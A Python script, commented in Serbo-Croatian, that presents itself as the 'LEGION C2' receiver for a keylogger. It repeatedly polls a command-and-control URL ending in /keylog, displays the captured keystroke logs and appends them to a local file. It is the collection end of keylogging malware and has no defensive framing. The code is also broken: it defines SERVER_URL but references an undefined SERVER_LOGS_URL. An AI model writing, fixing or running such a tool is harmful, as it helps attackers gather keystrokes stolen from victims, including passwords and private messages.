import requests
import time
import json
import datetime
import os
import sys

# 🔁 URL TVOG SERVERA NA RENDERU!
SERVER_URL = "https://legion-c2.onrender.com/keylog"

def clear_screen():
    """Briše ekran"""
    os.system('cls' if os.name == 'nt' else 'clear')

def matrix_style(text, color='92'):
    """Dodaje matrix stil (zelena boja)"""
    return f"\033[{color}m{text}\033[0m"

def print_header():
    """Ispisuje header sa matrix stilom"""
    clear_screen()
    print("="*60)
    print(matrix_style("🐉 LEGION C2 - MATRIX PRIJEMNIK"))
    print("="*60)
    print(matrix_style(f"Server: {SERVER_LOGS_URL}"))
    print(matrix_style("Čekam logove... (Ctrl+C za izlaz)"))
    print("-"*60)

def fetch_logs():
    """Povlači logove sa servera i prikazuje ih"""
    # Učitaj postojeće logove
    existing_logs = set()
    if os.path.exists("primljeni_logovi.txt"):
        with open("primljeni_logovi.txt", "r", encoding='utf-8') as f:
            for line in f:
                existing_logs.add(line.strip())
    
    last_count = 0
    
    while True:
        try:
            # Povuci logove sa servera
            response = requests.get(SERVER_LOGS_URL, timeout=10)
            
            if response.status_code == 200:
                logs = response.json()
                
                if logs:
                    # Prikaži SVE logove
                    print(f"\n{matrix_style('='*60, '93')}")
                    print(matrix_style(f"📊 UKUPNO LOGOVA: {len(logs)}", '93'))
                    print(matrix_style('='*60, '93'))
                    
                    # Prikaži svaki log
                    for i, log_entry in enumerate(logs, 1):
                        timestamp = log_entry.get('timestamp', 'N/A')
                        data = log_entry.get('data', '')
                        
                        # Skrati prikaz ako je predugačak
                        display_data = data[:100] + '...' if len(data) > 100 else data
                        
                        # Matrix stil - zeleno za timestamp, cijan za podatke
                        print(f"{matrix_style(f'[{i}]', '90')} {matrix_style(timestamp, '92')}")
                        print(f"    {matrix_style(display_data, '96')}")
                        print()
                        
                        # Sačuvaj u fajl ako nije već sačuvano
                        log_line = f"[{timestamp}] {data}"
                        if log_line not in existing_logs:
                            with open("primljeni_logovi.txt", "a", encoding='utf-8') as f:
                                f.write(f"{log_line}\n")
                            existing_logs.add(log_line)
                    
                    # Ažuriraj broj prikazanih logova
                    if len(logs) > last_count:
                        print(matrix_style(f"✓ Preuzeto {len(logs) - last_count} novih logova.", '92'))
                        last_count = len(logs)
                    else:
                        print(matrix_style("Nema novih logova.", '90'))
                        
                else:
                    print(matrix_style("📭 Nema logova na serveru.", '93'))
                    last_count = 0
                    
            else:
                print(matrix_style(f"✗ Greška pri povlačenju: {response.status_code}", '91'))
                print(matrix_style(f"✗ Odgovor: {response.text[:100]}", '91'))
                
        except requests.exceptions.ConnectionError:
            print(matrix_style("✗ Ne mogu se povezati na server!", '91'))
            print(matrix_style(f"✗ Provjeri URL: {SERVER_LOGS_URL}", '91'))
        except Exception as e:
            print(matrix_style(f"✗ Greška: {e}", '91'))
        
        # Čekaj prije sljedećeg pokušaja
        for i in range(10, 0, -1):
            sys.stdout.write(f"\r{matrix_style(f'⏳ Sljedeće osvježavanje za {i}s...', '90')}")
            sys.stdout.flush()
            time.sleep(1)
        
        # Ponovo prikaži header (osvježi ekran)
        print_header()

if __name__ == "__main__":
    print_header()
    
    try:
        fetch_logs()
    except KeyboardInterrupt:
        print("\n" + matrix_style("🛑 Prijemnik zaustavljen.", '93'))
